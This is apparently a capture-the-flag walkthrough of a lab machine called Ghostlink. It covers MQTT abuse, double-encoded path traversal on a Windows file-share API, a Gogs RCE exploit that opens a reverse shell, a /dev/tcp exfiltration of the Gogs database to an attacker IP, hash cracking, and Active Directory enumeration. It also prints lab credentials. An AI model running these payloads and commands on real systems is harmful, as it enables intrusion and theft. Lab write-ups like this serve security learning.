# Ghostlink

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.43.225

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/ghostlink_tcp.htb $ip
# 53/tcp    open  domain
# 80/tcp    open  http
# 88/tcp    open  kerberos-sec
# 135/tcp   open  msrpc
# 139/tcp   open  netbios-ssn
# 389/tcp   open  ldap
# 445/tcp   open  microsoft-ds
# 464/tcp   open  kpasswd5
# 593/tcp   open  http-rpc-epmap
# 636/tcp   open  ldapssl
# 1883/tcp  open  mqtt
# 2179/tcp  open  vmrdp
# 3268/tcp  open  globalcatLDAP
# 3269/tcp  open  globalcatLDAPssl
# 5985/tcp  open  wsman
# 9389/tcp  open  adws
# 49664/tcp open  unknown
# 49677/tcp open  unknown
# 49678/tcp open  unknown
# 49679/tcp open  unknown
# 49680/tcp open  unknown
# 49900/tcp open  unknown
# 49913/tcp open  unknown
# 60029/tcp open  unknown



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/ghostlink_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/ghostlink_udp.htb $ip
# 53/udp  open  domain
# 88/udp  open  kerberos-sec
# 123/udp open  ntp
# 389/udp open  ldap

```

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts file and scan for Vhosts**

{% code overflow="wrap" %}
```bash
nxc smb $ip --generate-hosts-file hosts
cat hosts | tee -a /etc/hosts

domain=ghostlink.htb
curl -s -I http://$ip -H "HOST: $domain" | grep "Content-Length:"
# Content-Length: 682

ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://$ip/ -H 'Host:FUZZ.$domain' -fs 682
```
{% endcode %}

**We didn't found any Vhosts so our focus now is on MQTT(1833), this proto looks interesting so lets do some pentest on it**&#x20;

<mark style="color:blue;">**Step 3**</mark>

**Pentesting MQTT (Mosquitto)**

{% hint style="info" %}
### [Basic Information](https://hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html#basic-information) <a href="#basic-information" id="basic-information"></a>

**MQ Telemetry Transport (MQTT) is known as a publish/subscribe messaging protocol that stands out for its extreme simplicity and lightness.This protocol is specifically tailored for environments where devices have limited capabilities and operate over networks that are characterized by low bandwidth, high latency, or unreliable connections.The core objectives of MQTT include minimizing the usage of network bandwidth and reducing the demand on device resources**
{% endhint %}

{% hint style="danger" %}
**Authentication is totally optional** and even if authentication is being performed, **encryption is not used by default** (credentials are sent in clear text). MITM attacks can still be executed to steal passwords.
{% endhint %}

{% code overflow="wrap" %}
```bash
mosquitto_sub -h $ip -t "#" -v
# We can subscribe to all event without creds 
```
{% endcode %}

This command give me  a **network blueprint**.

| Topic                                                      | IP                | URL / Hostname                                                                                   |
| ---------------------------------------------------------- | ----------------- | ------------------------------------------------------------------------------------------------ |
| **GhostProtocolZero/network/node/healthcheck**             | **10.129.43.225** | [**https://transport.ghostlink.htb/keepalive**](https://transport.ghostlink.htb/keepalive)       |
| **GhostProtocolZero/network/node/keepalive**               | **10.129.43.225** | [**https://core-telecom.ghostlink.htb/keepalive**](https://core-telecom.ghostlink.htb/keepalive) |
| **GhostProtocolZero/systems/node/domain/healthcheck**      | **10.129.43.225** | **dc01.ghostlink.htb/healthcheck**                                                               |
| **GhostProtocolZero/systems/node/repository/healthcheck**  | **10.129.43.225** | **gpz-op26-toolkits.ghostlink.htb/healthcheck**                                                  |
| **GhostProtocolZero/systems/node/secureshare/healthcheck** | **10.129.43.225** | **gpz-op26-secure.ghostlink.htb/healthcheck**                                                    |

{% hint style="info" %}
* **`node-1` (10.1.12.34), `node-3` (10.4.23.11) – telecom/energy nodes**
* **`node-4` (10.129.43.225) – domain controller / internal web**
* **`node-5` (172.16.20.20) – toolkit repository**
* **`node-6` (172.16.20.10) – secure share**
{% endhint %}

**We add this hosts on the file and lets discover them**&#x20;

{% code overflow="wrap" %}
```bash
echo "10.129.43.225 core-telecom.ghostlink.htb transport.ghostlink.htb gpz-op26-toolkits.ghostlink.htb gpz-op26-secure.ghostlink.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 4**</mark>

**First thing i want to do is to make a good wordlists with this users**

{% code overflow="wrap" %}
```bash
cat >> setup.txt <<EOF
heredoc> Vesper Roth
heredoc> Nyx Virelli
heredoc> Zara Kovacs
heredoc> Orin Hexley
heredoc> EOF

/opt/username-anarchy/username-anarchy -i setup.txt > user.txt
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>

**Before doing some brute-force or anything i prefer search for leaked data on this repo**

{% code overflow="wrap" %}
```bash
git clone http://gpz-op26-toolkits.ghostlink.htb/vroth/vortex-strike.git
git clone http://gpz-op26-toolkits.ghostlink.htb/vroth/shadow-pulse.git
git clone http://gpz-op26-toolkits.ghostlink.htb/zkovacs/cipher-breach.git
git clone http://gpz-op26-toolkits.ghostlink.htb/zkovacs/iron-crypt.git
git clone http://gpz-op26-toolkits.ghostlink.htb/ohexley/spectra-analyze.git
git clone http://gpz-op26-toolkits.ghostlink.htb/ohexley/nightfall-overwatch.git


for repo in vortex-strike shadow-pulse cipher-breach iron-crypt spectra-analyze nightfall-overwatch; do
    cd $repo
    echo "=== $repo ==="
    git log -p --all | grep -i -E "password|secret|key|token|api|flag|HTB" | head -50
    cd ..
done
```
{% endcode %}

**I found just a hardcoded password `gpz_op26`**

**i tried to brute force but it doesnt work so the other idea is to anaylse this still enumrating this subs until we found something interesting**

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

**We catch this  cache buster here. It's almost certainly the Git commit SHA of the Gogs binary used to build this instance, we visit the commit here** [**https://github.com/gogs/gogs/commit/5084b4a9b77a506f5e287e82e945e1c6882b827a**](https://github.com/gogs/gogs/commit/5084b4a9b77a506f5e287e82e945e1c6882b827a)

{% code overflow="wrap" %}
```go
)

func init() {
	conf.App.Version = "0.13.2"
	conf.App.Version = "0.13.3"
}

func main() {
```
{% endcode %}

**Now we know the version they use so lets try to found any vulnerability related to this,**

**We found that this version v0.13.3 is vulnearble to a RCE but we need a creds so lets do it after we found or catch any creds.**

<mark style="color:blue;">**Step 6**</mark>

**I tried many tools for mqtt clients but tbh i read the writeup i found that i did everything correct but the problem is in the tool so i use the one they used and it work**&#x20;

{% code overflow="wrap" %}
```bash
mqttui -b mqtt://ghostlink.htb publish  -r "GhostProtocolZero/systems/node/secureshare/healthcheck" '{"timestamp":"2026-03-03-09:26:21","node":"node-6","telemetry":
{"healthy":true,"url":"http://10.10.14.92","lastCheckSecAgo":45,"responseCode":"200","ip":"
172.16.20.10"}}'

python3 /opt/ghostsurf/ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb -r -k
# and i add a 1080 proxy on foxy proxy then it open 
```
{% endcode %}

**The way we used this because we have 6 nodes one is for repos and the ther you may need creds it still this secure file sharing that give us an idea that we need to abuse it**

{% hint style="info" %}
**every time i see a web app and an AD i tried to relay**&#x20;
{% endhint %}

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

**To use burp we need to configure an upstrem proxy rule  (Proxy Settings -> Network -> Connections -> SOCKS proxy)**&#x20;

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 7**</mark>

**Now let's discover the app it's a secure file upload or transfer it encrypt a file and gice you the link for it using a REST api so the main idea is to trying an LFI**

{% code overflow="wrap" %}
```bash
echo "/etc/passwd" | base64

curl -x 127.0.0.1:8081 "http://gpz-op26-secure.ghostlink.htb/api/download/L2V0Yy9ob3N0bmFtZQ=="
```
{% endcode %}

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

**It give 500 internal error so we may be touching a server here le'ts try more options**&#x20;

{% code overflow="wrap" %}
```
GET /api/download/../../../../../../etc/passwd HTTP/1.1
Host: gpz-op26-secure.ghostlink.htb
User-Agent: curl/8.19.0
Accept: */*
Connection: keep-alive


HTTP Error 403. The request URL is forbidden
```
{% endcode %}

**I think i make a payload work by double encoding him it give me 404 because we are on a windows app so the path we search does not exist**

{% code overflow="wrap" %}
```
/api/download/..\..\..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts  
i double encoded this it become like this and it work

/api/download/%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

[https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e)

**I use this repos to search the paths on windows**

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

**I used reglookup to analyze the file but he has some parsing problems so we use regripper**&#x20;

{% code overflow="wrap" %}
```bash
regripper -r NTUSER.dat -a 


Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
LastWrite Time 2026-05-13 01:56:02Z
MRUListEx = 0
  0 = db.zip
 
# the most intersting part is that db.zip 
```
{% endcode %}

**Since i dont know the path for this file i will brute force until i found it**&#x20;

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

**this gives internal error i dont know why  am sure am on the right path for recent files on windows**

**i tried to add a .lnk**

{% code overflow="wrap" %}
```
/api/download/%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255CUsers%255Csvc_canary%255CAppData%255CRoaming%255CMicrosoft%255CWindows%255CRecent%255Cdb.zip.lnk

\Users\svc_canary\Documents\Operations\Management\db.zip
```
{% endcode %}

**it give us the path for the real zip**&#x20;

{% code overflow="wrap" %}
```
C:\Users\svc_canary\Documents\Operations\Management\db.zip

/api/download/%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255CUsers%255Csvc_canary%255CDocuments%255COperations%255CManagement%255Cdb.zip 
```
{% endcode %}

**And it works**&#x20;

{% code overflow="wrap" %}
```bash
unzip db.zip
# we've got a KeePass 2 password database , let;s try to open it using the master key 
keepass2 db.kdbx

```
{% endcode %}

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Since in toolkit repos we have one user that is not migrated to central services we will login usign hsi creds**

{% code overflow="wrap" %}
```bash
vroth:mOo03jpsqx8JQYMBwvFP
```
{% endcode %}

<mark style="color:blue;">**Step 8**</mark>

**Now we will focus on the RCE to take a rev shell**

{% code overflow="wrap" %}
```bash
python3 CVE-2025-8110.py -u http://gpz-op26-toolkits.ghostlink.htb/ -lh 10.10.14.92 -lp 4444 -user vroth -pass 'mOo03jpsqx8JQYMBwvFP'

listener 4444
connect to [10.10.14.92] from (UNKNOWN) [10.129.43.225] 49852
bash: cannot set terminal process group (697): Inappropriate ioctl for device
bash: no job control in this shell
git@gpz-op26-toolkits:~/data/tmp/local-repo/7$
```
{% endcode %}

{% code overflow="wrap" %}
```bash
git@gpz-op26-toolkits:~/data/ssh$ cd /home
cd /home
git@gpz-op26-toolkits:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root     root     4096 Mar  9 19:25 .
drwxr-xr-x 18 root     root     4096 May  5 15:22 ..
drwxr-x---  3 nvirelli nvirelli 4096 Jul  1 17:30 nvirelli
```
{% endcode %}

**This give us a better idea that this user is local user on the target now let's try to pivot**&#x20;

<mark style="color:blue;">**Step 9**</mark>

{% code overflow="wrap" %}
```bash
git@gpz-op26-toolkits:~/custom/conf$ cat app.ini

[database]
TYPE     = sqlite3
HOST     = 127.0.0.1:5432
NAME     = gogs
SCHEMA   = public
USER     = gogs
PASSWORD =
SSL_MODE = disable
PATH     = data/gogs.db
```
{% endcode %}

**we tranfer the database and we open it locally**

{% code overflow="wrap" %}
```bash
nc -lvp 4444 > gogs.db
cat /opt/gogs/data/gogs.db > /dev/tcp/10.10.14.92/4444

sqlite3 gogs.db
.schema
SELECT id, name, passwd, is_admin FROM user;
#2|nvirelli|8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8|1

```
{% endcode %}

[https://github.com/shinris3n/GogsToHashcat](https://github.com/shinris3n/GogsToHashcat)

**But we need to extract the SALT also**&#x20;

{% code overflow="wrap" %}
```bash
sqlite3 gogs.db "SELECT salt FROM user WHERE name='nvirelli';"
DW3YdxPy25

python3 GogsToHashcat.py  DW3YdxPy25 8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8 -o hashcat.hash
# sha256:10000:RFczWWR4UHkyNQ==:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=
```
{% endcode %}

**we have this password policies that says min lenght is 20**&#x20;

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
grep -E '^.{20,}$' /usr/share/wordlists/rockyou.txt  > wordlists.txt

hashcat -m 10900 hashcat.hash wordlists.txt --potfile-disable
u47YUclrDiwWxBheaSzI
```
{% endcode %}

**let's pivot to nvirelli**

<mark style="color:blue;">**Step 9**</mark>

{% code overflow="wrap" %}
```bash
ip a

2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:32:7a:01 brd ff:ff:ff:ff:ff:ff
    altname enx00155d327a01
    inet 172.16.20.20/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe32:7a01/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
```
{% endcode %}

**Let's pivot to AD and start scanning**

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">ss -tuln 
<strong># tcp   LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*
</strong>ssh nvirelli@240.0.0.1 -p 2222
</code></pre>

**I found many things interesting i pivot to 172.16.20.0/24 but when i try to enumarate the AD like a dead end so with the DMZ IP it works i dont know why however now we have a domain user on AD**&#x20;

```bash
bloodhound-python -c all -u $user -p $pass -d $domain -ns $ip --zip
# i dont have any intersting ACL also the shares nothing and every entry point 

```

{% code overflow="wrap" %}
```bash
certipy-ad find -u '$user@$domain' -p $pass -dc-host $dc -ns 10.129.244.158 -dns-tcp -timeout 10 -vulnerable -stdout

 CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
   DNS Name                            : gpz-op26-secure.ghostlink.htb
    Certificate Subject                 : CN=ghostlink-GPZ-OP26-SECURE-CA, DC=ghostlink, DC=htb
    Certificate Serial Number           : 3F4302F3D68A6AAE4B792DB93F31CCE5
    Certificate Validity Start          : 2026-03-03 16:52:14+00:00
    Certificate Validity End            : 2126-03-03 17:02:12+00:00
```
{% endcode %}

